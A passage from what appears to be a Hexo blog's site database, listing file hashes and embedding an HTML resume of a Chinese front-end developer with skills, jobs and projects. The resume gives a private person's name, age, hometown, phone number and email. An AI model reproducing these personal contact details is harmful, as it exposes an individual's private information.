:"81014d24afbc5579aaff2762a039501faa9d4124","modified":1594721436465},{"_id":"public/categories/ReactNative/index.html","hash":"449a57b928c886503e9195f1336873af115007b6","modified":1594721436465},{"_id":"public/categories/JavasCript/index.html","hash":"9f97a889fcb25cfbdcd39429c438781dccd72e25","modified":1594721436465},{"_id":"public/categories/微信/index.html","hash":"38099b5429d11ee1c005718061db96fc0c1313e1","modified":1594721436465},{"_id":"public/categories/数据库/index.html","hash":"de660c97108c1a12d031d4d3dd470e98af364f85","modified":1594721436465},{"_id":"public/categories/reactjs/index.html","hash":"7643c51f90b5aad520817100336c8103178104c9","modified":1594721436465},{"_id":"public/categories/vue-js/index.html","hash":"b8a3788403e4595b32fbf66f70ee8ff093600573","modified":1594721436466},{"_id":"public/categories/设计模式/index.html","hash":"d1639f152e30a4f23e026df24fe496c94ca631dd","modified":1594721436466},{"_id":"public/categories/CSS/index.html","hash":"1d86afde2a9b8f7d6b15d8f85b981d2b01c7d46b","modified":1594721436465},{"_id":"public/page/2/index.html","hash":"034bd18a4511b7fddb2ab353a7d4917bcec21b26","modified":1594721436465},{"_id":"public/index.html","hash":"e0ce2103e2f43bddafdf73521f2305686c5d4449","modified":1594721436465},{"_id":"public/tags/ReactNative/index.html","hash":"dc7867ea52605d3ef6e9f6af13da4e6fae9f587e","modified":1594721436466},{"_id":"public/tags/微信小程序/index.html","hash":"a1541e0edd66d6197397a45b7f8e1b016839b38d","modified":1594721436466},{"_id":"public/tags/SCSS/index.html","hash":"26d7a46d5cfb2d7037a43a6162b5bf0988ab1836","modified":1594721436466},{"_id":"public/tags/JavasCript/index.html","hash":"1e4ceb536d1130f6e8246ce227033f9928780da8","modified":1594721436466},{"_id":"public/tags/MongoDB/index.html","hash":"ea6ed578ffae0265bc3991f3c207d35e770e17d8","modified":1594721436466},{"_id":"public/tags/reactjs/index.html","hash":"0c1085e67f7b4bc6b2019c08ad891dc58b7e3cbf","modified":1594721436466},{"_id":"public/tags/vue-js/index.html","hash":"5d83565ea578c0ee10d38e1b32caf927d1a0290f","modified":1594721436466},{"_id":"public/tags/设计模式/index.html","hash":"f24d298713e06b823cb70fc9baae4635a941634e","modified":1594721436466},{"_id":"public/archives/2020/06/index.html","hash":"717b111148d431eaacc1e602ac6acbc95d88ed14","modified":1594721436465},{"_id":"public/images/cc-by-nc.svg","hash":"8d39b39d88f8501c0d27f8df9aae47136ebc59b7","modified":1594721264462},{"_id":"public/images/cc-by-nd.svg","hash":"c563508ce9ced1e66948024ba1153400ac0e0621","modified":1594721264462},{"_id":"public/images/apple-touch-icon-next.png","hash":"0de1a4798cd41a523f84aaeee2fecbaf6a7f5586","modified":1594721264462},{"_id":"public/images/cc-by-sa.svg","hash":"aa4742d733c8af8d38d4c183b8adbdcab045872e","modified":1594721264462},{"_id":"public/images/cc-by-nc-sa.svg","hash":"3031be41e8753c70508aa88e84ed8f4f653f157e","modified":1594721264462},{"_id":"public/images/cc-by.svg","hash":"28a0a4fe355a974a5e42f68031652b76798d4f7e","modified":1594721264462},{"_id":"public/images/cc-zero.svg","hash":"87669bf8ac268a91d027a0a4802c92a1473e9030","modified":1594721264462},{"_id":"public/images/loading.gif","hash":"5fbd472222feb8a22cf5b8aa5dc5b8e13af88e2b","modified":1594721264462},{"_id":"public/images/favicon-32x32-next.png","hash":"5dfda0c37ef1caf005051d79031d4e86cc053da0","modified":1594721264462},{"_id":"public/images/logo.svg","hash":"a2e960fa0d07037ae9c7bc99ade03487cf89d452","modified":1594721264462},{"_id":"public/images/cc-by-nc-nd.svg","hash":"c6524ece3f8039a5f612feaf865d21ec8a794564","modified":1594721264462},{"_id":"public/images/favicon-16x16-next.png","hash":"ed1ada47b26099382019b578447f5ab4504425d4","modified":1594721264462},{"_id":"public/images/placeholder.gif","hash":"5fbd472222feb8a22cf5b8aa5dc5b8e13af88e2b","modified":1594721264462},{"_id":"public/images/quote-r.svg","hash":"e60ae504f9d99b712c793c3740c6b100d057d4ec","modified":1594721264463},{"_id":"public/images/searchicon.png","hash":"67727a6a969be0b2659b908518fa6706eed307b8","modified":1594721264463},{"_id":"public/images/quote-l.svg","hash":"94e870b4c8c48da61d09522196d4dd40e277a98f","modified":1594721264463},{"_id":"public/images/next/apple-touch-icon-next.png","hash":"2959dbc97f31c80283e67104fe0854e2369e40aa","modified":1594721264463},{"_id":"public/images/next/favicon-16x16-next.png","hash":"943a0d67a9cdf8c198109b28f9dbd42f761d11c3","modified":1594721264463},{"_id":"public/images/next/avatar.gif","hash":"264082bb3a1af70d5499c7d22b0902cb454b6d12","modified":1594721264463},{"_id":"public/images/next/logo.svg","hash":"d29cacbae1bdc4bbccb542107ee0524fe55ad6de","modified":1594721264463},{"_id":"public/images/next/favicon-32x32-next.png","hash":"0749d7b24b0d2fae1c8eb7f671ad4646ee1894b1","modified":1594721264463},{"_id":"public/hireme/fonts/iconfont/iconfont.svg","hash":"d943edbf8ccffc4281fac1e13daed8bbd23f22d2","modified":1594721264464},{"_id":"public/hireme/fonts/iconfont/iconfont.ttf","hash":"af5d16858f67a047be6d9b55a550e2c874820e0b","modified":1594721264465},{"_id":"public/hireme/fonts/iconfont/iconfont.woff","hash":"e1ea017b3a000c7bae133b4a32a8fc3a56e5f0d8","modified":1594721264465},{"_id":"public/hireme/fonts/iconfont/iconfont.eot","hash":"a6586029d0b2e7def0716ac9cfdd03b33feb7cf9","modified":1594721264465},{"_id":"public/hireme/fonts/iconfont/iconfont.woff2","hash":"7ef42d09b72dd4b702dfdb91e946afa39ce8b1e4","modified":1594721264465},{"_id":"public/posts/12cd2a8e/1562307165857.png","hash":"9b1cfb83ad7951476f3760c09eb284d04e8b15d8","modified":1594721264465},{"_id":"public/posts/12cd2a8e/loading.gif","hash":"be54f2e6957c6622de6fe0de9be8848cd8c2a92a","modified":1594721264465},{"_id":"public/posts/12cd2a8e/loadinga-1562307323724.gif","hash":"b909c7e3a96613f6d30ec0911d46de71052c8f80","modified":1594721264465},{"_id":"public/posts/e61ae078/image-20200326151248022.png","hash":"356f2e6509993f97746ce4b680d842cdfeacfc71","modified":1594721264466},{"_id":"public/posts/e61ae078/image-20200326151335084.png","hash":"f05081ad4c8c46a51ffa05d95e9fef3b045e07ce","modified":1594721264466},{"_id":"public/posts/e61ae078/image-20200326155234896.png","hash":"48dd4642edd2068bc9e000132467d7e1f22c166c","modified":1594721264466},{"_id":"public/posts/e61ae078/image-20200326155524158.png","hash":"7e48fe0b1fe7df69f9b9313ff31b0b31096e033c","modified":1594721264466},{"_id":"public/posts/e61ae078/image-20200326160914205.png","hash":"842c132354b989bf53416beea1607b931eadd968","modified":1594721264466},{"_id":"public/posts/e61ae078/image-20200327083821128.png","hash":"536569b15575b21c8529807bfee580dd266b39ea","modified":1594721264466},{"_id":"public/posts/e61ae078/image-20200327084507790.png","hash":"4b9d4087a202ffb0365dff5ef3105b6a34bcba4a","modified":1594721264466},{"_id":"public/posts/e61ae078/image-20200331154722643.png","hash":"9c893ac267a53be34ae4beba4e37f943a089c3f0","modified":1594721264466},{"_id":"public/posts/e61ae078/image-20200327085101363.png","hash":"c944a1f8edcffb2ca7a92de38b4ab0244b2daf65","modified":1594721264466},{"_id":"public/posts/3b43e344/1559829814808.png","hash":"85df8d274037ee23b17136b1985681dcf6e6f44b","modified":1594721264467},{"_id":"public/posts/3b43e344/1559832421561.png","hash":"62600684b6796600ac2b084f69c208510d500d71","modified":1594721264467},{"_id":"public/posts/a8054c2/react-redux.png","hash":"ab3d439765c2a6aa7dd29b09a2f96e40e1d605eb","modified":1594721264467},{"_id":"public/posts/3b43e344/2019-06-06_22-54-19.png","hash":"ae6a43ea4bac39ec7abc5ec4ec5534185cd1546a","modified":1594721264467},{"_id":"public/posts/3b43e344/20190606223710.png","hash":"9bef8f1d144eb6ffd75fb1a8f5b783c2cd4f3f68","modified":1594721264467},{"_id":"public/posts/e61ae078/image-20200331155044160.png","hash":"293c5134a40c2d26789bf22c6e9a63f25257aa82","modified":1594721264466},{"_id":"public/posts/6316/微信小程序的生命周期.png","hash":"3e3f7c88d0030c271a8532fbeaf07e69697c70bb","modified":1594721264465},{"_id":"public/images/algolia_logo.svg","hash":"ec119560b382b2624e00144ae01c137186e91621","modified":1594721264462},{"_id":"public/images/avatar.jpg","hash":"8ea641f8d55c10463338c47cdba681da634c2bd7","modified":1594721264462},{"_id":"public/hireme/images/timg.jpg","hash":"0c7f572866c29b0bd5ec0835d26316d87533f0bf","modified":1594721265066},{"_id":"public/posts/8814181e/prototype.jpg","hash":"f9c290ef5dad27604b772894d479c3a1c590999a","modified":1594721265069},{"_id":"public/posts/12cd2a8e/111.gif","hash":"257593c800a2325b5d9e9a5028eeb4e9205faea2","modified":1594721265070},{"_id":"public/posts/e61ae078/image-20200326154915534.png","hash":"5e2742642e854389a0d85b58949046791812149d","modified":1594721264466},{"_id":"public/posts/e61ae078/SectionList.gif","hash":"7556739b03bda8a6f252ec6e7e89ba6ee5e66a27","modified":1594721265070},{"_id":"public/posts/e61ae078/image-20200331154557560.png","hash":"ced5a02d26843cb1b7a9a260be9e6309ba6ca8fe","modified":1594721265071},{"_id":"public/posts/9a246216/观察者模式.png","hash":"75a6c8c3c36e6a2b07d83bd31abdd9a2d712796d","modified":1594721264467},{"_id":"public/js/algolia-search.js","hash":"1f7f10c579e7703d0f6acb8b73f3d78a07d0c623","modified":1594721265079},{"_id":"public/js/affix.js","hash":"a2aab233d99297435a5274bf512c3c753fe08e80","modified":1594721265079},{"_id":"public/js/js.cookie.js","hash":"e0afce539f1fb81d59e3c6f0a68d736e2fb45d93","modified":1594721265079},{"_id":"public/js/exturl.js","hash":"54825acc8de4793feac415be227b965428f4e97d","modified":1594721265079},{"_id":"public/js/next-boot.js","hash":"e0615efab5f81ba0fd39c0527eac31144deac7ce","modified":1594721265080},{"_id":"public/js/post-details.js","hash":"0dde5e6d4547587662a3256317a9d5d1db507692","modified":1594721265080},{"_id":"public/js/motion.js","hash":"a16bc0b701646bf6653484675f4d5dc0f892d184","modified":1594721265080},{"_id":"public/js/utils.js","hash":"703375f367acfbd0596733c34437d1b2681abf72","modified":1594721265080},{"_id":"public/js/scroll-cookie.js","hash":"d07b3776708d4ae79ed2037c4c7391d5c9b06b19","modified":1594721265080},{"_id":"public/js/scrollspy.js","hash":"fa3c92968bcdbcb8d95a1729f7659d9753cbd077","modified":1594721265080},{"_id":"public/js/schemes/muse.js","hash":"e9bfa6b343b67625f58757efce46ccdaac8f308c","modified":1594721265080},{"_id":"public/js/schemes/pisces.js","hash":"9eb63cba0327d3d11b6cbfcbe40b88e97a8378a3","modified":1594721265080},{"_id":"public/lib/velocity/velocity.ui.min.js","hash":"ed5e534cd680a25d8d14429af824f38a2c7d9908","modified":1594721265080},{"_id":"public/css/main.css","hash":"b144709108cb188ad33a0c251653f9609c14a52c","modified":1594721265080},{"_id":"public/lib/velocity/velocity.min.js","hash":"2f1afadc12e4cf59ef3b405308d21baa97e739c6","modified":1594721265080},{"_id":"public/lib/velocity/velocity.ui.js","hash":"6a1d101eab3de87527bb54fcc8c7b36b79d8f0df","modified":1594721265081},{"_id":"public/lib/jquery/index.js","hash":"41b4bfbaa96be6d1440db6e78004ade1c134e276","modified":1594721265081},{"_id":"public/lib/velocity/velocity.js","hash":"9f08181baea0cc0e906703b7e5df9111b9ef3373","modified":1594721265081},{"_id":"public/images/next/avata111r.jpg","hash":"f0ec8e13785a9ace32cd415e9bcdbfbcdff2e2f4","modified":1594721265067},{"_id":"public/posts/ea50967e/案例实战.gif","hash":"a337e440ad20d8610ba0fa9081692ba3df46daca","modified":1594721265125},{"_id":"public/posts/12cd2a8e/asc.gif","hash":"c5030ed623b224e98ed91f8463395108b045d13b","modified":1594721265070},{"_id":"public/posts/12cd2a8e/loadinga.gif","hash":"02b8eb44187d9b316bb97a3d4773c38a8703d81d","modified":1594721265070},{"_id":"public/posts/a8054c2/react-redux耦合.gif","hash":"3e58e90ac9041dad60968277d43fcd8e81b336ea","modified":1594721265081},{"_id":"public/posts/12cd2a8e/asc-1562308830171.gif","hash":"ef94e8495df27e4704ae3099a39113622897f71c","modified":1594721265070},{"_id":"public/posts/e61ae078/FlatList.gif","hash":"4a6d51565c6010154f367ad2a9f319f635426501","modified":1594721265125},{"_id":"public/posts/3b43e344/calendar.gif","hash":"f0e2f038bc996b4f42941399a6d76ec0cbfaa65a","modified":1594721265408},{"_id":"public/posts/e61ae078/ScrollView.gif","hash":"8a5755de010fb695d93dc96aca26d6d30a009f11","modified":1594721265422},{"_id":"public/posts/e61ae078/movielist.gif","hash":"575dca208e80e0a2e091f011db3432fac3cfe69a","modified":1594721265426}],"Category":[{"name":"ReactNative","_id":"ckclr4u2h0002qrwts94swbul"},{"name":"CSS","_id":"ckclr4u370007qrwtygzw0rth"},{"name":"微信","_id":"ckclr4u3e000cqrwt17hp8eg2"},{"name":"JavasCript","_id":"ckclr4u3g000gqrwto3m62eyx"},{"name":"数据库","_id":"ckclr4u3m000nqrwt2bdkpjs4"},{"name":"reactjs","_id":"ckclr4u5t000yqrwtxjaymcxn"},{"name":"vue.js","_id":"ckclr4u5x0015qrwtz74ukw6e"},{"name":"设计模式","_id":"ckclr4u610019qrwtvwuccwxe"}],"Data":[],"Page":[{"layout":"false","comments":0,"_content":"\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta\n      name=\"viewport\"\n      content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\"\n    />\n    <meta name=\"keywords\" content=\"简历\" />\n    <meta name=\"description\" content=\"单页简历\" />\n    <meta name=\"author\" content=\"houfee\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" />\n    <meta charset=\"UTF-8\" />\n    <title>我的简历</title>\n    <!-- <link rel=\"stylesheet\" href=\"assets/bootstrap/css/bootstrap.css\"> -->\n    <!-- Bootstrap -->\n    <link\n      href=\"https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css\"\n      rel=\"stylesheet\"\n    />\n    <link rel=\"stylesheet\" href=\"fonts/iconfont/iconfont.css\" />\n    <!-- [if lt IE 9]\n  <script src=\"assets/html5shiv/html5shiv.min.js\"></script>\n  <script src=\"assets/respond/respond.min.js\"></script>\n  [endif] -->\n    <!--[if lt IE 9]>\n      <script src=\"https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js\"></script>\n      <script src=\"https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js\"></script>\n    <![endif]-->\n    <link rel=\"stylesheet\" href=\"css/index.css\" />\n  </head>\n\n  <body class=\"container\">\n    <!-- 导航栏 -->\n    <!-- <nav class=\"res-navbar\">\n    <div class=\"navbar-header\">\n      <button type=\"button\" class=\"navbar-toggle collapsed\" data-toggle=\"collapse\" data-target=\"#bs-example-navbar-collapse-1\">\n        <span class=\"icon-bar\"></span>\n        <span class=\"icon-bar\"></span>\n        <span class=\"icon-bar\"></span>\n      </button>\n      <span class=\"navbar-brand\">\n        <span class=\"iconfont icon-zhaopin\"></span>\n      </span>\n    </div>\n    <div class=\"collapse navbar-collapse\" id=\"bs-example-navbar-collapse-1\">\n      <ul class=\"nav navbar-nav\">\n        <li class=\"active\"><a href=\"#res-introduce\">个人介绍</a></li>\n        <li><a href=\"#res-skill\">技能展示</a></li>\n        <li><a href=\"#res-company\">工作经历</a></li>\n        <li><a href=\"#res-project\">项目经验</a></li>\n        <li><a href=\"#res-skill\">自我评价</a></li>\n      </ul>\n      <ul class=\"nav navbar-nav navbar-right hidden-sm\">\n        <li><a href=\"https://houfee.github.io/\">我的博客</a></li>\n      </ul>\n    </div>\n  </nav> -->\n\n    <!-- 个人介绍 -->\n    <div id=\"res-introduce\" class=\"res-introduce\">\n      <!-- 头像部分 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12 col-sm-3 avatar-box\">\n          <img class=\"my-avatar\" src=\"./images/timg.jpg\" alt=\"头像\" />\n        </div>\n        <!-- 文字介绍部分 -->\n        <div class=\"col-xs-12 col-sm-9 my-info\">\n          <!-- 第一行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4 items\">姓名：</div>\n              <div class=\"col-xs-8 col-sm-8\">侯飞</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4 items\">年龄：</div>\n              <div class=\"col-xs-8 col-sm-8\">25</div>\n            </div>\n          </div>\n          <!-- 第二行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">籍贯：</div>\n              <div class=\"col-xs-8 col-sm-8\">河北张家口</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">学历：</div>\n              <div class=\"col-xs-8 col-sm-8\">本科</div>\n            </div>\n          </div>\n          <!-- 第三行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">毕业院校：</div>\n              <div class=\"col-xs-8 col-sm-8\">唐山学院</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">毕业时间：</div>\n              <div class=\"col-xs-8 col-sm-8\">2017-07</div>\n            </div>\n          </div>\n          <!-- 第四行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">手机号：</div>\n              <div class=\"col-xs-8 col-sm-8\">13261351763</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">邮箱：</div>\n              <div class=\"col-xs-8 col-sm-8\">allen1710@163.com</div>\n            </div>\n          </div>\n          <!-- 第五行 -->\n          <div class=\"row\">\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">工作经验:</div>\n              <div class=\"col-xs-8 col-sm-8\">3年</div>\n            </div>\n            <div class=\"col-xs-12 col-sm-6\">\n              <div class=\"col-xs-4 col-sm-4\">应聘职位：</div>\n              <div class=\"col-xs-8 col-sm-8\">web前端工程师</div>\n            </div>\n          </div>\n        </div>\n      </div>\n    </div>\n\n    <!-- 技能展示 -->\n    <div id=\"res-skill\" class=\"res-skill\">\n      <!-- 小标题 -->\n      <div class=\"row\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          职业技能\n        </h4>\n      </div>\n      <!-- 内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            具有三年 Web 开发经验，熟练掌握H5、C3，能够基于scss等拓展语言快速开发，构建出高性 能并且兼容性好的Web应用\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <span class=\"values\">\n            具有扎实的JS基础，并且熟练掌握ES6新语法\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            熟练掌握 Vue、Vue Router、Vuex等相关技术栈，能够根据业务需求封装特定组件\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            熟练掌握Hybird APP开发，对移动端适配和JS与原生交互有一定研究\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            掌握React、Redux，能够基于antd快速开发后台管理系统，有RN开发经验\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            熟练掌握Webpack、Babel和PostCSS，会配置常用的loader和plugin，能够快速构建工程\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            基本熟悉Node，会用Node编写提高工作效率的脚本，会使用Express进行接口开发\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\">\n            熟练掌握ESlint配置，并在项目中使用，统一编码规范\n          </span>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-hand-right\"></span>\n          <!-- <span class=\"items\"> 新时代学雷锋：</span> -->\n          <span class=\"values\"> 熟练掌握Git和SVN等版本控制工具的使用</span>\n        </div>\n      </div>\n    </div>\n\n    <!-- 工作经历 -->\n    <div id=\"res-company\" class=\"res-company\">\n      <!-- 小标题 -->\n      <div class=\"row sub-title\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          工作经历\n        </h4>\n      </div>\n      <!-- 公司名 及 工作岗位 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">2018.9-至今</span>\n          <span class=\"items\">中科软科技（web前端工程师）</span>\n        </div>\n      </div>\n      <!-- 岗位职责 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2019.6 – 至今</span>\n          <p class=\"values\">参与APP独立小应用的开发；</p>\n        </div>\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2019.3 – 2019.5</span>\n          <p class=\"values\">负责牙牙预约H5页面的开发工作，并配合后台完成系统升级；</p>\n        </div>\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2018.9 – 2019.2</span>\n          <p class=\"values\">负责Hybrid App 开发，负责预约功能、视频播放、大图预览等模块开发</p>\n        </div>\n      </div>\n      <br />\n      <!-- 公司名 及 工作岗位 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">2018.8 - 2017.7</span>\n          <span class=\"items\">北京橙悦科技有限公司（web前端工程师）</span>\n        </div>\n      </div>\n      <!-- 岗位职责 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2018.2 – 2018.8</span>\n          <p class=\"values\">参与摄影器材租赁系统后端管理平台开发工作；负责公司首页开发的开发工作，以及公众号的开发。 </p>\n        </div>\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2017.8 – 2018.1</span>\n          <p class=\"values\">负责公司首页开发的开发工作，以及公众号的开发。 </p>\n        </div>\n      </div>\n    </div>\n\n    <!-- 练手项目 -->\n    <div id=\"res-project\" class=\"res-company\">\n      <!-- 小标题 -->\n      <div class=\"row sub-title\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          练手项目\n        </h4>\n      </div>\n      <!-- 111111111111111 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2020.2 – 至今&nbsp;&nbsp;&nbsp;Vue移动端的组件库-lightui </span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：一个轻量级的<a href=\"https://github.com/houfee/light-ui\">vue移动端组件库</a>\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">1、 升级vue-cli2依赖包，包括babel、webpack以及其他loader</p>\n          <p class=\"values\">\n            2、 参考cube-ui的打包模式，依赖一套package，构建生成组件模块、\n            <a href=\"https://houfee.github.io/light-ui/example/#/\">example</a>和\n            <a href=\"https://houfee.github.io/light-ui/#/zh-CN\">文档网址</a>\n          </p>\n          <p class=\"values\">3、 参考element-ui的scss设计思想，并在项目中使用</p>\n          <p class=\"values\">4、 将现有的vue组件库的优秀组件添加到lightui中。</p>\n        </div>\n      </div>\n      <br />\n      <!-- 44444444444444 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">2019.10 – 2020.1&nbsp;&nbsp;&nbsp;react后台管理项目</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：后台管理项目，包括\n            <a href=\"http://49.235.41.140:8080/#/login\">用户登录</a>、\n            <a href=\"http://49.235.41.140:8080/#/home\">首页</a>、\n            <a href=\"http://49.235.41.140:8080/#/category\">商品管理</a>、\n            <a href=\"http://49.235.41.140:8080/#/user\">用户管理</a>以及\n            <a href=\"http://49.235.41.140:8080/#/charts/bar\">图形图标</a>等模块\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">1、使用antd组件库搭建项目结构，完成该项目的用户管理，首页等多个模块的开发</p>\n          <p class=\"values\">2、通过jsonp方式请求第三方天气接口，为项目添加天气模块</p>\n          <p class=\"values\">3、使用echarts添加可视化图形模块，使用draftjs-to-html为项目添加富文本编辑器</p>\n          <p class=\"values\">4、使用redux进行状态管理</p>\n        </div>\n      </div>\n    </div>\n\n    <!-- 项目经验 -->\n    <div id=\"res-project\" class=\"res-company\">\n      <!-- 小标题 -->\n      <div class=\"row sub-title\">\n        <h4 class=\"col-xs-12 col-sm-3\">\n          <span class=\"glyphicon glyphicon-tag\"></span>\n          项目经验\n        </h4>\n      </div>\n      <!-- 111111111111111 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">APP小应用开发：2019.6 – 至今</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：完成多个功能的小应用开发，包括预约、详情、评价、内容介绍等任务\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">\n            1、改造vue-cli，使用postcss相关插件完成移动端的适配\n          </p>\n          <p class=\"values\">\n            2、根据业务需求完成公共组件，包括日历选择组件，时间颗粒度选择组件，证件弹框组件等\n          </p>\n          <p class=\"values\">\n            3、通过 vue-router 的生命周期钩子判断不同入口的页面返回以及跳转，并且在该页面销毁时将数 据保存在vuex中\n          </p>\n          <p class=\"values\">\n            4、通过 js 和原生交互，实现原生向页面注数据，以及 js 调取原生的相机、地图、电话等组件，并 且实现页面埋点，统计访问数据\n          </p>\n          <p class=\"values\">5、配合产品完成页面功能改进，提升用户体检</p>\n        </div>\n      </div>\n      <br />\n      <!-- 44444444444444 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">牙牙预约：2019.3 - 2019.5</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-lock\"></span>\n          <span class=\"items\">\n            项目描述：牙牙预约为客户提供牙齿健康预约服务，进行Vue多页面开发，在不同平台有不同的样式风格，以及不同渠道的预约门店等不同\n          </span>\n        </div>\n      </div>\n      <!-- 工作内容 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-saved\"></span>\n          <span class=\"items\">我的工作：</span>\n          <p class=\"values\">1、将老项目代码从SVN移植到GitLab；相似渠道代码归并，减少代码量</p>\n          <p class=\"values\">2、根据业务需求重构代码，便于用于新渠道开发</p>\n          <p class=\"values\">3、重写并替换项目冗余组件，便于项目维护和移植</p>\n          <p class=\"values\">4、调用高德、腾讯等地图组件，实现定位功能</p>\n          <p class=\"values\">5、配合后端同事完成数据优化以及实现新需求</p>\n        </div>\n      </div>\n      <br />\n      <!-- 2222222222222222222 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon glyphicon-time\"></span>\n          <span class=\"items\">富通App：2018.9 – 2019.2</span>\n        </div>\n      </div>\n      <!-- 项目描述 -->\n      <div class=\"row\">\n        <div class=\"col-xs-12\">\n          <span class=\"glyphicon 